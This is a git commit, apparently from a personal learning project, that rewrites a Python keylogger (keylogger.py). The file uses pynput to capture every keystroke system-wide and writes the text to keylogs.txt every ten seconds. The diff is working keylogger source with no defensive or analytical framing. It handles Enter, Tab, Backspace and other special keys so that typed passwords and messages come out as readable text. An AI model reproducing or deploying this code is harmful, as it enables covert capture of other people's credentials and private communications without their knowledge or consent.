41dbb2bd44d6ccb0f4a1e7e48661b3f0ef354544
AysenurDad <1aysenurdag@gmail.com>
2025-04-10 23:15:00 +0300

    keylogger writes the data of keystrokes in a txt file

--- keylogger /keylogger.py
+++ keylogger /keylogger.py
@@ -1,31 +1,47 @@
 from pynput import keyboard
-#for seetting timer , we need to use threading library
 import threading
 
 text = ""
-interval = 10 # Time interval in seconds
+interval = 10  # time interval in seconds
 
-# Function to send the key pressed to a file
 def send():
     global text
-
     try:
-        print(text)
+        # we open file in append mode to add new data to the end of the file
+        with open("keylogs.txt", "a") as f:
+            f.write(text)
+        print("Datas written to file:", text)
+        
+        # we reset the text variable to empty string after writing to file 
         text = ""
+        
+        # we restart the timer .
         timer = threading.Timer(interval, send)
         timer.start()
-    except:
-        print("Error in sending text")
-   
+    except Exception as e:
+        print("Error in sending tex:", e)
 
-# Function to write the key pressed to a file
 def on_press(key):
     global text 
-    
-    text += str(key)
-
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass  
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        text += str(key).strip("'")
 
 with keyboard.Listener(on_press=on_press) as listener:
-    
-    send() # Start sending the text every interval seconds
-    listener.join()# Keep the listener running
+    send() 
+    listener.join()
